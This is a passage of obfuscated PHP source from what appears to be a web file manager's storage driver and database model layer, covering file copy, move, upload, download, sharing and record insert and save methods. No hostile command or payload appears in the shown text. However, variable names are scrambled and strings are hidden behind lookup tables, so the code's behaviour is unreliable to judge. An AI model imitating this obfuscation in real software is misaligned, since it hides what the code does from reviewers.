copyFile($Ş¨Í¦â¾, $ô½êí‡, $Ùƒé·ÇÓ = REPEAT_REPLACE) { $’˜áîÄ¹ =& $_SERVER[‹è™Ü¸Ñ]; $â…²€Î• = $this->parse($ô½êí‡); $³¯“Ë¹ë = $this->model->copy($Ş¨Í¦â¾, $â…²€Î•[$’˜áîÄ¹[475]], $Ùƒé·ÇÓ, $â…²€Î•[$’˜áîÄ¹[87]]); return $³¯“Ë¹ë ? $this->getPathOuter($³¯“Ë¹ë) : !1; } public function moveFile($©Ó†²©·, $ å–ù¢‰, $ˆè¤ü Ê = REPEAT_REPLACE) { $¾÷¸àĞÉ =& $_SERVER[‹è™Ü¸Ñ]; $€Ë™İ¨” = $this->parse($ å–ù¢‰); $¸…°ìÔÔ = $this->model->move($©Ó†²©·, $€Ë™İ¨”[$¾÷¸àĞÉ[475]], $ˆè¤ü Ê, $€Ë™İ¨”[$¾÷¸àĞÉ[87]]); return $¸…°ìÔÔ ? $this->getPathOuter($¸…°ìÔÔ) : !1; } public function copy($ü¬‚‚í×, $æÒĞ•ı, $¢³¶Ş ² = REPEAT_REPLACE, $öÂ¡õºÓ = false) { $Ìû‹Æ«Ä = $this->parse($æÒĞ•ı); $Ìû«ÅÍÙ = $this->model->copy($ü¬‚‚í×, $Ìû‹Æ«Ä[$_SERVER[‹è™Ü¸Ñ][475]], $¢³¶Ş ², $öÂ¡õºÓ); return $Ìû«ÅÍÙ ? $this->getPathOuter($Ìû«ÅÍÙ) : !1; } public function moveSameAllow() { } public function move($ è®ƒÜ, $‚¯Øº±€, $ƒì‘¶Ğ = REPEAT_REPLACE, $°„åÌŠÄ = false) { $ì¦Õ° = $this->parse($‚¯Øº±€); $œˆ¥›¦Ê = $this->model->move($ è®ƒÜ, $ì¦Õ°[$_SERVER[‹è™Ü¸Ñ][475]], $ƒì‘¶Ğ, $°„åÌŠÄ); return $œˆ¥›¦Ê ? $this->getPathOuter($œˆ¥›¦Ê) : !1; } public function remove($Í±¿ñÁÂ, $Ôî¡Ìªò = true) { return $this->model->remove($Í±¿ñÁÂ, $Ôî¡Ìªò); } public function rename($ºç¸¼¯ª, $‘ÖÎ¦Ø‘) { $£ â¬àÖ = $this->model->rename($ºç¸¼¯ª, $‘ÖÎ¦Ø‘); return $£ â¬àÖ ? $this->getPathOuter($ºç¸¼¯ª) : $£ â¬àÖ; } public function size($çêåÍ€) { $ÔÎ¹¡¸¨ = $this->infoSimple($çêåÍ€); return $ÔÎ¹¡¸¨ ? $ÔÎ¹¡¸¨[$_SERVER[‹è™Ü¸Ñ][79]] : 0; } public function infoSimple($¨ßúÕ¶²) { return $this->model->sourceInfo($¨ßúÕ¶²); } public function info($ÅöŸĞÛÑ) { return $this->infoParse($ÅöŸĞÛÑ); } public function infoAuth($úşõ•È÷) { return $this->infoParse($úşõ•È÷, !1, !0); } public function infoWithChildren($•¬áı¶) { return $this->infoParse($•¬áı¶, !0); } protected function infoParse($×¼¦ÁçÇ, $±ÖŒ÷Øš = false, $¾»È‰ù = false) { if (!$±ÖŒ÷Øš) { return $this->model->pathInfo($×¼¦ÁçÇ, $¾»È‰ù); } return $this->model->pathInfoMore($×¼¦ÁçÇ); } public function infoFullSimple($›¾ùÖÌ£) { $úöÜƒÏ¼ =& $_SERVER[‹è™Ü¸Ñ]; $¡áˆìÛ = explode($úöÜƒÏ¼[8], $›¾ùÖÌ£); $Ó«åøÑ¶ = implode($úöÜƒÏ¼[8], array_splice($¡áˆìÛ, 1)); return $this->model->pathInfoByPath($¡áˆìÛ[0], $Ó«åøÑ¶); } public function infoFull($à¡·±Ç) { $îÚüè = $this->infoFullSimple($à¡·±Ç); return is_array($îÚüè) ? $this->model->pathInfo($îÚüè[$_SERVER[‹è™Ü¸Ñ][193]]) : !1; } public function hashSimple($´ç…òßÃ) { $İÙğÓ½Ô =& $_SERVER[‹è™Ü¸Ñ]; $ –îª„ß = $this->infoWithChildren($´ç…òßÃ); return $ –îª„ß[$İÙğÓ½Ô[170]][$İÙğÓ½Ô[672]]; } public function hashMd5($ßú—ÖôÈ) { $Œó§°ê× =& $_SERVER[‹è™Ü¸Ñ]; $÷ƒƒˆ¿ú = $this->infoWithChildren($ßú—ÖôÈ); return $÷ƒƒˆ¿ú[$Œó§°ê×[170]][$Œó§°ê×[547]]; } public function exist($Â³Ì×Ñ­) { $“ñö¹€Š =& $_SERVER[‹è™Ü¸Ñ]; $ÎˆàÜÑ‹ = $this->parse($Â³Ì×Ñ­); if (!$ÎˆàÜÑ‹[$“ñö¹€Š[87]]) { return $this->isFile($Â³Ì×Ñ­) || $this->isFolder($Â³Ì×Ñ­); } $³ËÉ™†« = array($“ñö¹€Š[477] => $ÎˆàÜÑ‹[$“ñö¹€Š[475]], $“ñö¹€Š[32] => $ÎˆàÜÑ‹[$“ñö¹€Š[87]]); $äÄæóÜ = $this->model->where($³ËÉ™†«)->find(); return $äÄæóÜ ? !0 : !1; } public function isFile($¾û“¸Êæ) { $öÑÇı¶Ÿ =& $_SERVER[‹è™Ü¸Ñ]; $èÈó¼šı = $this->infoSimple($¾û“¸Êæ); return $èÈó¼šı && $èÈó¼šı[$öÑÇı¶Ÿ[485]] == $öÑÇı¶Ÿ[228] ? !0 : !1; } public function isFolder($ÌŒÔöÍ) { $ıªõ¶êá =& $_SERVER[‹è™Ü¸Ñ]; $’ûŸ¿Øš = $this->infoSimple($ÌŒÔöÍ); return $’ûŸ¿Øš && $’ûŸ¿Øš[$ıªõ¶êá[485]] == $ıªõ¶êá[91] ? !0 : !1; } public function listPath($ë¤…ß¨Ã, $Ä«™ÔÃÀ = false) { $›ã«Ãœº =& $_SERVER[‹è™Ü¸Ñ]; if ($ë¤…ß¨Ã == $›ã«Ãœº[12]) { return !1; } $–Ñ·éá = array($›ã«Ãœº[477] => $ë¤…ß¨Ã); if ($Ä«™ÔÃÀ) { return $this->model->listSource($–Ñ·éá, -1); } return $this->model->listSource($–Ñ·éá); } public function has($Ÿ·ä¦–’, $…†¸Ïİ = false, $àÈ™°„ò = null) { $¤‰š«€È =& $_SERVER[‹è™Ü¸Ñ]; $å¢ÕÁè“ = $this->infoWithChildren($Ÿ·ä¦–’); if ($…†¸Ïİ) { return array($¤‰š«€È[240] => $å¢ÕÁè“[$¤‰š«€È[240]], $¤‰š«€È[239] => $å¢ÕÁè“[$¤‰š«€È[239]]); } return $àÈ™°„ò ? $å¢ÕÁè“[$¤‰š«€È[240]] : $å¢ÕÁè“[$¤‰š«€È[239]]; } public function listAll($Ï§«¶‚) { $û‰»Èæâ = IO::info($this->pathParse[$_SERVER[‹è™Ü¸Ñ][87]]); if (!$û‰»Èæâ) { return array(); } return $this->model->listAll($Ï§«¶‚); } public function getContent($¡§§ø¾ë) { return $this->model->getContent($¡§§ø¾ë); } public function setContent($»íà˜Ã•, $¨®—¬êŞ = '') { return $this->model->setContent($»íà˜Ã•, $¨®—¬êŞ); } public function fileSubstr($Êş ©Ò, $ÈåíÓÃ, $“Íş¨è) { return $this->model->fileSubstr($Êş ©Ò, $ÈåíÓÃ, $“Íş¨è); } public function download($Øá–Ü›¨, $ÏÅ˜öÀŸ = '') { $¿’Ê³é— = get_path_father($ÏÅ˜öÀŸ); $‚Øş‘á = get_path_this($ÏÅ˜öÀŸ); $é„å÷¨Ö = $this->model->fileInfoGet($Øá–Ü›¨); $àæ®Ï˜© = IO::copy($é„å÷¨Ö[$_SERVER[‹è™Ü¸Ñ][87]], $¿’Ê³é—, !1, $‚Øş‘á); return $àæ®Ï˜©; } public function setModifyTime($ßİ¬ß, $¨§İö©é = '') { $ÄŸšÆË =& $_SERVER[‹è™Ü¸Ñ]; if (!$ßİ¬ß) { return; } $this->model->where(array($ÄŸšÆË[491] => $ßİ¬ß))->save(array($ÄŸšÆË[88] => $¨§İö©é)); } public function upload($æ·öæ‘É, $Ô‹— ™ü, $ÒûÕë¨ = false, $ñ‹äª›ç = REPEAT_REPLACE) { $ßÄ’Ã®˜ =& $_SERVER[‹è™Ü¸Ñ]; $³¿¢ÓÂĞ = $this->parse($æ·öæ‘É); $±³õÂ¦µ = $this->model->addFile($³¿¢ÓÂĞ[$ßÄ’Ã®˜[475]], $Ô‹— ™ü, $³¿¢ÓÂĞ[$ßÄ’Ã®˜[87]], $ÒûÕë¨, $ñ‹äª›ç); return $this->getPathOuter($±³õÂ¦µ); } public function uploadFileByID($¡¼œ¸ç½, $€øïĞß, $åò°öñ) { $° óøı =& $_SERVER[‹è™Ü¸Ñ]; $Àá•ä¶ = $this->parse($¡¼œ¸ç½); $”ÂçÜ³Æ = $this->model->addFileByFileID($Àá•ä¶[$° óøı[475]], $€øïĞß, $Àá•ä¶[$° óøı[87]], $åò°öñ); return $this->getPathOuter($”ÂçÜ³Æ); } public function addFileByRemote($Ç•Ù¤‚ğ, $¿Èšç¢ª, $àß¤€¸“ = array(), $ğ²„Êš = '', $ÇÂ¤¸æ) { $¯±×©ï” =& $_SERVER[‹è™Ü¸Ñ]; $ğÌ”Ğ² = $this->parse($Ç•Ù¤‚ğ); $ğ²„Êš = empty($ğ²„Êš) ? $ğÌ”Ğ²[$¯±×©ï”[87]] : $ğ²„Êš; $Õë¿ÌàÕ = $this->model->addFileByRemote($ğÌ”Ğ²[$¯±×©ï”[475]], $¿Èšç¢ª, $ğ²„Êš, $àß¤€¸“, $ÇÂ¤¸æ); return $this->getPathOuter($Õë¿ÌàÕ); } public function uploadLink($åÉÔÁ¡, $À€¶¸ºù = 0) { $ŸÚôã‹´ =& $_SERVER[‹è™Ü¸Ñ]; $¹è¡Ü’¼ = $this->parse($åÉÔÁ¡); $–ïìÎ¡“ = _get($GLOBALS[$ŸÚôã‹´[7]], $ŸÚôã‹´[1400]); $°àĞÚ“í = _get($GLOBALS[$ŸÚôã‹´[7]], $ŸÚôã‹´[1401]); $åÉÔÁ¡ = Model($ŸÚôã‹´[674])->createFileName($¹è¡Ü’¼[$ŸÚôã‹´[87]], $–ïìÎ¡“, $°àĞÚ“í); return IO::uploadLink($åÉÔÁ¡, $À€¶¸ºù); } public function fileNameAuto($òĞäÕõó, $’®ÓûÓ, $€¸»çâ² = REPEAT_REPLACE, $´ŞìÜ±í = false) { return $this->model->fileNameAuto($òĞäÕõó, $’®ÓûÓ, $€¸»çâ², $´ŞìÜ±í); } public function fileNameExist($·ø°Ò¾ø, $¶–”ãˆ‰) { return $this->model->fileNameExist($·ø°Ò¾ø, $¶–”ãˆ‰); } protected function _fileOut($çØŠúŠê, $€±×ä = false, $Î¿Œ¿Ñ– = false, $¦ó¡èŞò = '', $äÓàÌÖÍ = false) { $¶Ş¶ë¿È =& $_SERVER[‹è™Ü¸Ñ]; $ËÄèğ•é = $this->model->sourceInfo($çØŠúŠê); if ($ËÄèğ•é[$¶Ş¶ë¿È[485]] == $¶Ş¶ë¿È[91]) { header($¶Ş¶ë¿È[1402]); die; } $âºŒÎ´² = $this->model->fileInfoGet($çØŠúŠê); $¦ó¡èŞò = $âºŒÎ´²[$¶Ş¶ë¿È[547]] ? $âºŒÎ´²[$¶Ş¶ë¿È[547]] : $¦ó¡èŞò; $åÕÂ’Úö = isset($GLOBALS[$¶Ş¶ë¿È[182]]) && is_array($GLOBALS[$¶Ş¶ë¿È[182]]) ? $GLOBALS[$¶Ş¶ë¿È[182]][$¶Ş¶ë¿È[32]] : $ËÄèğ•é[$¶Ş¶ë¿È[32]]; if ($äÓàÌÖÍ) { return IO::fileOutServer($âºŒÎ´²[$¶Ş¶ë¿È[87]], $€±×ä, $åÕÂ’Úö, $¦ó¡èŞò); } IO::fileOut($âºŒÎ´²[$¶Ş¶ë¿È[87]], $€±×ä, $åÕÂ’Úö, $¦ó¡èŞò); } public function fileOut($ûÉÕçÚé, $ÕüØŒ‚ü = false, $êŠÔˆº = false, $ š•Êêµ = '') { $this->_fileOut($ûÉÕçÚé, $ÕüØŒ‚ü, $êŠÔˆº, $ š•Êêµ); } public function fileOutServer($è±¼—ºØ, $šºüùï¬ = false, $¥ë×ŸÑë = false, $æ˜÷­¤¤ = '') { $this->_fileOut($è±¼—ºØ, $šºüùï¬, $¥ë×ŸÑë, $æ˜÷­¤¤, !0); } protected function _fileOutImage($ß²ş—™Ú, $”ãŞ×‹‰ = 250) { $¶õÆ¹”¾ =& $_SERVER[‹è™Ü¸Ñ]; $®Ûäë³ = $this->model->pathInfo($ß²ş—™Ú); if ($®Ûäë³[$¶õÆ¹”¾[485]] == $¶õÆ¹”¾[91]) { show_json($¶õÆ¹”¾[1403] . $ß²ş—™Ú, !1); } $¹¾¬ö = $this->model->fileInfoGet($ß²ş—™Ú); $®Ûäë³[$¶õÆ¹”¾[183]] = $¹¾¬ö[$¶õÆ¹”¾[87]]; $GLOBALS[$¶õÆ¹”¾[182]] = $®Ûäë³; IO::fileOutImage($¹¾¬ö[$¶õÆ¹”¾[87]], $”ãŞ×‹‰); } public function fileOutImage($Ëé®‘¢, $¿“»Ù¿¹ = 250) { $this->_fileOutImage($Ëé®‘¢, $¿“»Ù¿¹); } public function fileOutImageServer($éÂêÚ†ê, $Ú›‹ëæî = 250) { $this->_fileOutImage($éÂêÚ†ê, $Ú›‹ëæî); } public function link($‚ ¦º±é, $ø¯‹è„Š = '') { $…º¤£Ù = $this->model->fileInfoGet($‚ ¦º±é); return IO::link($…º¤£Ù[$_SERVER[‹è™Ü¸Ñ][87]], $ø¯‹è„Š); } protected function parse($ØªŸ©Û¨) { $öê§…Ÿ§ =& $_SERVER[‹è™Ü¸Ñ]; if (strstr($ØªŸ©Û¨, $öê§…Ÿ§[8]) === !1) { return array($öê§…Ÿ§[493] => intval($ØªŸ©Û¨), $öê§…Ÿ§[87] => $öê§…Ÿ§[12], $öê§…Ÿ§[1399] => array()); } $Ãæ×ñ = explode($öê§…Ÿ§[8], trim($ØªŸ©Û¨, $öê§…Ÿ§[8])); if (count($Ãæ×ñ) < 2) { show_tips(clear_html($ØªŸ©Û¨) . $öê§…Ÿ§[1404]); } return array($öê§…Ÿ§[493] => intval($Ãæ×ñ[0]), $öê§…Ÿ§[87] => $Ãæ×ñ[1], $öê§…Ÿ§[1399] => array_slice($Ãæ×ñ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($”˜¯àÔÃ) { $this->pathParse = $”˜¯àÔÃ; $this->model = Model($_SERVER[‹è™Ü¸Ñ][1398]); } public function getPathOuter($¢û‹Ç²à) { $¨†£Œï· =& $_SERVER[‹è™Ü¸Ñ]; if (!$¢û‹Ç²à) { return $¢û‹Ç²à; } $«¨¨¾üÉ = $this->parse($¢û‹Ç²à); return trim(KodIO::makeShare($this->pathParse[$¨†£Œï·[475]], $«¨¨¾üÉ[$¨†£Œï·[475]]), $¨†£Œï·[8]); } protected function infoParse($ˆ÷‡İş, $–”šÊ¤Î = false, $ºÕ°ûÛ = false) { $³¸Ô¼éŸ =& $_SERVER[‹è™Ü¸Ñ]; $¨Íè€Â = $this->pathParse[$³¸Ô¼éŸ[475]]; $Ş¨äª¿® = trim($this->pathParse[$³¸Ô¼éŸ[1230]], $³¸Ô¼éŸ[8]); return Action($³¸Ô¼éŸ[1405])->sharePathInfo($¨Íè€Â, $Ş¨äª¿®, $–”šÊ¤Î); } public function infoFull($»Šö€™‰) { $™ƒ‹‚£ =& $_SERVER[‹è™Ü¸Ñ]; $´û¸ÊˆŒ = explode($™ƒ‹‚£[8], trim($»Šö€™‰, $™ƒ‹‚£[8])); if (count($´û¸ÊˆŒ) > 1) { $ôóØşãÕ = implode($™ƒ‹‚£[8], array_splice($´û¸ÊˆŒ, 1)); $†²Ë‚ƒ = $this->model->pathInfoByPath($´û¸ÊˆŒ[0], $ôóØşãÕ); if (!$†²Ë‚ƒ) { return !1; } $this->pathParse[$™ƒ‹‚£[1230]] = $†²Ë‚ƒ[$™ƒ‹‚£[193]]; } return $this->infoParse($»Šö€™‰); } public function listAll($Úîã®Ûâ) { $Œ¢Ùö§„ =& $_SERVER[‹è™Ü¸Ñ]; $Úåšä” = IO::info($this->pathParse[$Œ¢Ùö§„[87]]); if (!$Úåšä”) { return array(); } $éºöµûÚ = $this->model->listAll($Úîã®Ûâ); $Ñ©èùŸÉ = Model($Œ¢Ùö§„[664])->getInfo($Úåšä”[$Œ¢Ùö§„[665]]); foreach ($éºöµûÚ as &$üñ¥÷˜É) { check_abort(); $üñ¥÷˜É[$Œ¢Ùö§„[90]] = Action($Œ¢Ùö§„[1405])->_shareItemeParse($üñ¥÷˜É[$Œ¢Ùö§„[90]], $Ñ©èùŸÉ); } unset($üñ¥÷˜É); return $éºöµûÚ; } } goto Dõ¥™İªƒÃ; AóÇ –¨Ñ: define($_SERVER[‹è™Ü¸Ñ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\162\144\x65\162", "\141\154\x69\141\x73", "\x68\141\166\151\x6e\147", "\x67\162\157\x75\160", "\x6c\157\143\153", "\144\151\x73\x74\151\156\143\164", "\x61\x75\164\x6f", "\146\151\154\164\x65\x72", "\x76\141\x6c\151\144\141\x74\145", "\x72\x65\163\x75\154\164", "\142\151\x6e\144", "\164\157\153\x65\x6e"); public function __construct($›ŸúÅã = '', $´‰Ï‰£° = '', $·æÁÒ… = '') { $äóÏŒ‘† =& $_SERVER[‹è™Ü¸Ñ]; $this->_initialize(); if (!empty($›ŸúÅã)) { if (strpos($›ŸúÅã, $äóÏŒ‘†[10])) { list($this->dbName, $this->name) = explode($äóÏŒ‘†[10], $›ŸúÅã); } else { $this->name = $›ŸúÅã; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($´‰Ï‰£°)) { $this->tablePrefix = $äóÏŒ‘†[12]; } elseif ($äóÏŒ‘†[12] != $´‰Ï‰£°) { $this->tablePrefix = $´‰Ï‰£°; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($äóÏŒ‘†[321]); } $this->db(0, empty($this->connection) ? $·æÁÒ… : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $…ºñê©Ø =& $_SERVER[‹è™Ü¸Ñ]; if (empty($this->fields)) { if (think_config($…ºñê©Ø[322])) { $òÙáóš = $this->dbName ? $this->dbName : think_config($…ºñê©Ø[323]); $ Ä€¢¿• = think_var_cache($…ºñê©Ø[324] . strtolower(get_path_this($òÙáóš) . $…ºñê©Ø[10] . $this->name)); if ($ Ä€¢¿•) { $ÙÍöÊÜ· = think_config($…ºñê©Ø[325]); if (empty($ÙÍöÊÜ·) || $ Ä€¢¿•[$…ºñê©Ø[326]] == $ÙÍöÊÜ·) { $this->fields = $ Ä€¢¿•; return; } } } $this->flush(); } } public function flush() { $ÚŸáÜø† =& $_SERVER[‹è™Ü¸Ñ]; $this->db->setModel($this->name); $ä¢È—°ı = $this->db->getFields($this->getTableName()); if (!$ä¢È—°ı) { return !1; } $this->fields = array_keys($ä¢È—°ı); $this->fields[$ÚŸáÜø†[327]] = !1; foreach ($ä¢È—°ı as $Æ·—²ŸÎ => $ÊÓÁ£™é) { $¦ìğ¿»Ğ[$Æ·—²ŸÎ] = $ÊÓÁ£™é[$ÚŸáÜø†[33]]; if ($ÊÓÁ£™é[$ÚŸáÜø†[39]]) { $this->fields[$ÚŸáÜø†[328]] = $Æ·—²ŸÎ; if ($ÊÓÁ£™é[$ÚŸáÜø†[42]]) { $this->fields[$ÚŸáÜø†[327]] = !0; } } } $this->fields[$ÚŸáÜø†[329]] = $¦ìğ¿»Ğ; if (think_config($ÚŸáÜø†[325])) { $this->fields[$ÚŸáÜø†[326]] = think_config($ÚŸáÜø†[325]); } if (think_config($ÚŸáÜø†[322])) { $—î¨Úğ = $this->dbName ? $this->dbName : think_config($ÚŸáÜø†[323]); think_var_cache($ÚŸáÜø†[324] . strtolower(get_path_this($—î¨Úğ) . $ÚŸáÜø†[10] . $this->name), $this->fields); } } public function switchModel($¾ÍË«š, $­”±óÑİ = array()) { $À‚§·¢‹ =& $_SERVER[‹è™Ü¸Ñ]; $ú˜ñê²ğ = ucwords(strtolower($¾ÍË«š)) . $À‚§·¢‹[330]; if (!class_exists($ú˜ñê²ğ)) { think_exception($ú˜ñê²ğ . think_lang($À‚§·¢‹[331])); } $this->_extModel = new $ú˜ñê²ğ($this->name); if (!empty($­”±óÑİ)) { foreach ($­”±óÑİ as $ûüÑä«) { $this->_extModel->setProperty($ûüÑä«, $this->{$ûüÑä«}); } } return $this->_extModel; } public function __set($§ìğ°÷, $ğëó˜‚) { $this->data[$§ìğ°÷] = $ğëó˜‚; } public function __get($ìŞ·—Äû) { return isset($this->data[$ìŞ·—Äû]) ? $this->data[$ìŞ·—Äû] : null; } public function __isset($ûÌœã¯) { return isset($this->data[$ûÌœã¯]); } public function __unset($ÆÍèèèç) { unset($this->data[$ÆÍèèèç]); } public function __call($Ïğ·šŞÊ, $áúÄ¹´) { $ûì£‰šÇ =& $_SERVER[‹è™Ü¸Ñ]; if (in_array(strtolower($Ïğ·šŞÊ), $this->methods, !0)) { $this->options[strtolower($Ïğ·šŞÊ)] = $áúÄ¹´[0]; return $this; } elseif (in_array(strtolower($Ïğ·šŞÊ), array($ûì£‰šÇ[332], $ûì£‰šÇ[333], $ûì£‰šÇ[334], $ûì£‰šÇ[335], $ûì£‰šÇ[336]), !0)) { $¾ÊŠí¦ = isset($áúÄ¹´[0]) ? $áúÄ¹´[0] : $ûì£‰šÇ[220]; $¾ÊŠí¦ = $this->db->parseKey($¾ÊŠí¦); return $this->getField(strtoupper($Ïğ·šŞÊ) . $ûì£‰šÇ[337] . $¾ÊŠí¦ . $ûì£‰šÇ[338] . $Ïğ·šŞÊ, $ûì£‰šÇ[332]); } elseif (strtolower(substr($Ïğ·šŞÊ, 0, 5)) == $ûì£‰šÇ[339]) { $¾ÊŠí¦ = think_parse_name(substr($Ïğ·šŞÊ, 5)); $–Ú²úƒ‚[$¾ÊŠí¦] = $áúÄ¹´[0]; return $this->where($–Ú²úƒ‚)->find(); } elseif (strtolower(substr($Ïğ·šŞÊ, 0, 10)) == $ûì£‰šÇ[340]) { $¥è‹­Ö‚ = think_parse_name(substr($Ïğ·šŞÊ, 10)); $–Ú²úƒ‚[$¥è‹­Ö‚] = $áúÄ¹´[0]; return $this->where($–Ú²úƒ‚)->getField($áúÄ¹´[1]); } elseif (isset($this->_scope[$Ïğ·šŞÊ])) { return $this->scope($Ïğ·šŞÊ, $áúÄ¹´[0]); } elseif (method_exists($this, $Ïğ·šŞÊ)) { array_unshift($áúÄ¹´, $Ïğ·šŞÊ); return call_user_func_array(array($this, $ûì£‰šÇ[341]), $áúÄ¹´); } else { return call_user_func_array(array(parent, $Ïğ·šŞÊ), $áúÄ¹´); } } protected function call() { $±Ò½À®“ =& $_SERVER[‹è™Ü¸Ñ]; $Û–ÄÕàƒ = func_get_args(); $öğûåÒ = array_shift($Û–ÄÕàƒ); $ğŸğ±¤ú = $öğûåÒ; if (is_array($öğûåÒ)) { $ğŸğ±¤ú = $öğûåÒ[1]; $öğûåÒ = $öğûåÒ[0]; } $çã¼†Ñø = count($Û–ÄÕàƒ) - 1; if (isset($Û–ÄÕàƒ[$çã¼†Ñø]) && $Û–ÄÕàƒ[$çã¼†Ñø] === $öğûåÒ) { think_exception(__CLASS__ . $±Ò½À®“[4] . $öğûåÒ . think_lang($±Ò½À®“[342])); return; } $Û–ÄÕàƒ[] = $öğûåÒ; if (method_exists($this, $±Ò½À®“[343])) { $¤üÔÎ† = call_user_func_array(array($this, $±Ò½À®“[344]), array($ğŸğ±¤ú, $Û–ÄÕàƒ)); if (!is_null($¤üÔÎ†) && $¤üÔÎ† !== !1) { return $¤üÔÎ†; } } $é¦µò±´ = call_user_func_array(array($this, $öğûåÒ), $Û–ÄÕàƒ); if (method_exists($this, $±Ò½À®“[345])) { $¤üÔÎ† = call_user_func_array(array($this, $±Ò½À®“[346]), array($ğŸğ±¤ú, $Û–ÄÕàƒ, $é¦µò±´)); if ($¤üÔÎ†) { return $¤üÔÎ†; } } return $é¦µò±´; } protected function _initialize() { } protected function _facade($®¸äÌÊä) { $‹‹ É¨ =& $_SERVER[‹è™Ü¸Ñ]; if (!empty($this->fields)) { foreach ($®¸äÌÊä as $Ò§›Ûû´ => $›¹•úÌä) { if (is_array($this->fields) && !in_array($Ò§›Ûû´, $this->fields, !0)) { unset($®¸äÌÊä[$Ò§›Ûû´]); } elseif (is_scalar($›¹•úÌä)) { $this->_parseType($®¸äÌÊä, $Ò§›Ûû´); } } } if (!empty($this->options[$‹‹ É¨[347]])) { $®¸äÌÊä = array_map($this->options[$‹‹ É¨[347]], $®¸äÌÊä); unset($this->options[$‹‹ É¨[347]]); } $this->_beforeWrite($®¸äÌÊä); return $®¸äÌÊä; } protected function _beforeWrite(&$±·óÎÊô) { } public function add($ÕÊ†æğÌ = '', $§…±¥áÖ = array(), $å¬À”Ğ€ = false) { if (empty($ÕÊ†æğÌ)) { if (!empty($this->data)) { $ÕÊ†æğÌ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‹è™Ü¸Ñ][348]); return !1; } } $§…±¥áÖ = $this->_parseOptions($§…±¥áÖ); $ÕÊ†æğÌ = $this->_facade($ÕÊ†æğÌ); if (!1 === $this->_beforeInsert($ÕÊ†æğÌ, $§…±¥áÖ)) { return !1; } $Şñø ˆí = $this->db->insert($ÕÊ†æğÌ, $§…±¥áÖ, $å¬À”Ğ€); if (!1 !== $Şñø ˆí) { $ìöç®ÀÄ = $this->getLastInsID(); if ($ìöç®ÀÄ) { $ÕÊ†æğÌ[$this->getPk()] = $ìöç®ÀÄ; $this->_after_insert($ÕÊ†æğÌ, $§…±¥áÖ); return $ìöç®ÀÄ; } $this->_after_insert($ÕÊ†æğÌ, $§…±¥áÖ); } return $Şñø ˆí; } protected function _beforeInsert(&$‹­Ë­ö, $Ê–úú) { } protected function _after_insert($›Í»è ½, $æÀô±ÌÆ) { } public function addAll($Åˆ¥¢Š®, $©Û¥èß = array(), $ã±Â÷ˆ‚ = false) { $×–ƒÉµ£ =& $_SERVER[‹è™Ü¸Ñ]; if (empty($Åˆ¥¢Š®)) { $this->error = think_lang($×–ƒÉµ£[348]); return !1; } $©Û¥èß = $this->_parseOptions($©Û¥èß); foreach ($Åˆ¥¢Š® as $å®×Á—® => $æïŞºáı) { $Åˆ¥¢Š®[$å®×Á—®] = $this->_facade($æïŞºáı); } if (method_exists($this->db, $×–ƒÉµ£[349])) { $¨™Šßİ = $this->db->insertAll($Åˆ¥¢Š®, $©Û¥èß, $ã±Â÷ˆ‚); } else { $this->startTrans(); foreach ($Åˆ¥¢Š® as $å®×Á—® => $æïŞºáı) { $¨™Šßİ = $this->db->insert($æïŞºáı, $©Û¥èß, $ã±Â÷ˆ‚); } $this->commit(); } if (!1 !== $¨™Šßİ) { $‘à¼áê¥ = $this->getLastInsID(); if ($‘à¼áê¥) { return $‘à¼áê¥; } } return $¨™Šßİ; } public function selectAdd($¹¦Å‰…¿ = '', $•ÅÅ Úæ = '', $ÕÅ§ú³Ğ = array()) { $”©™ó‰Œ =& $_SERVER[‹è™Ü¸Ñ]; $ÕÅ§ú³Ğ = $this->_parseOptions($ÕÅ§ú³Ğ); if (!1 === ($à “”Ìê = $this->db->selectInsert($¹¦Å‰…¿ ? $¹¦Å‰…¿ : $ÕÅ§ú³Ğ[$”©™ó‰Œ[350]], $•ÅÅ Úæ ? $•ÅÅ Úæ : $this->getTableName(), $ÕÅ§ú³Ğ))) { $this->error = think_lang($”©™ó‰Œ[351]); return !1; } else { return $à “”Ìê; } } public function save($Åß€Ñ–œ = '', $‹„½Í½¦ = array()) { $ğÔŠÚª‹ =& $_SERVER[‹è™Ü¸Ñ]; if (empty($Åß€Ñ–œ)) { if (!empty($this->data)) { $Åß€Ñ–œ = $this->data; $this->data = array(); } else { $this->error = think_lang($ğÔŠÚª‹[348]); return !1; } } $Åß€Ñ–œ = $this->_facade($Åß€Ñ–œ); $‹„½Í½¦ = $this->_parseOptions($‹„½Í½¦); $ÃšĞ—¦œ = $this->getPk(); if (!isset($‹„½Í½¦[$ğÔŠÚª‹[352]])) { if (isset($Åß€Ñ–œ[$ÃšĞ—¦œ])) { $ìò’«°ã[$ÃšĞ—¦œ] = $Åß€Ñ–œ[$ÃšĞ—¦œ]; $‹„½Í½¦[$ğÔŠÚª‹[352]] = $ìò’«°ã; unset($Åß€Ñ–œ[$ÃšĞ—¦œ]); } else { $this->error = think_lang($ğÔŠÚª‹[351]); return !1; } } if (is_array($‹„½Í½¦[$ğÔŠÚª‹[352]]) && isset($‹„½Í½¦[$ğÔŠÚª‹[352]][$ÃšĞ—¦œ])) { $Ô¬İò“ = $‹„½Í½¦[$ğÔŠÚª‹[352]][$ÃšĞ—¦œ]; } if (!1 === $this->_beforeUpdate($Åß€Ñ–œ, $‹„½Í½¦)) { return !1; } $‡Ç‚æ = $this->db->update($Åß€Ñ–œ, $‹„½Í½¦); if (!1 !== $‡Ç‚æ) { if (isset($Ô¬İò“)) { $Åß€Ñ–œ[$ÃšĞ—¦œ] = $Ô¬İò“; } $this->_afterUpdate($Åß€Ñ–œ, $‹„½Í½¦); } return $‡Ç‚æ; } protected function _beforeUpdate(&$ºÑŸÄïÈ, $»­ˆˆú…) { } protected function _afterUpdate($¸½••ˆÄ, $¡’°ÒÚİ) { } public function delete($Œ¦¾å˜™ = array()) { $úÇ†‚øµ =& 